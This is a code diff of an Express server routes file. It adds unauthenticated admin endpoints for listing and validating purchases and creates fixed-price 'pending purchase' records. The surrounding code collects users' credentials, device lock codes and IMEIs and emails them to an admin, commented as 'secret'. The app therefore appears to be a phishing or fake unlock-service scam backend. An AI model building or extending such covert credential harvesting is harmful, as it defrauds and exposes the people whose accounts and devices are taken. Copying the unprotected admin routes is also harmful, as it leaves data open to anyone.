@@ -8,11 +8,33 @@ import {
   UserCredentials 
 } from "./email";
 import { generateLomeLocation } from "../client/src/lib/device-data";
+import { insertPurchaseSchema } from "@shared/schema";
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Health check endpoint
   app.get('/api/health', (req, res) => {
     res.json({ status: 'ok', timestamp: new Date().toISOString() });
+  });
+
+  // Admin: Get all purchases
+  app.get('/api/admin/purchases', async (req, res) => {
+    const purchases = await storage.getPurchases();
+    res.json(purchases);
+  });
+
+  // Admin: Validate purchase
+  app.patch('/api/admin/purchases/:id', async (req, res) => {
+    const id = parseInt(req.params.id);
+    const { status, userEmail, device, imei } = req.body;
+
+    const updated = await storage.updatePurchaseStatus(id, status);
+    if (!updated) return res.status(404).json({ error: 'Purchase not found' });
+
+    if (status === 'validated') {
+      await sendPaymentConfirmation(userEmail, device, imei);
+    }
+
+    res.json(updated);
   });
 
   // Submit user credentials and send to admin
@@ -33,6 +55,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
         lockCode,
         imei
       };
+
+      // Create a pending purchase record
+      await storage.createPurchase({
+        userId: null,
+        device,
+        imei,
+        amount: 5000, // Fixed amount for now
+        status: "pending",
+        userEmail: email
+      });
 
       // Send credentials to admin (secret)
       const adminEmailSent = await sendUserCredentialsToAdmin(credentials);
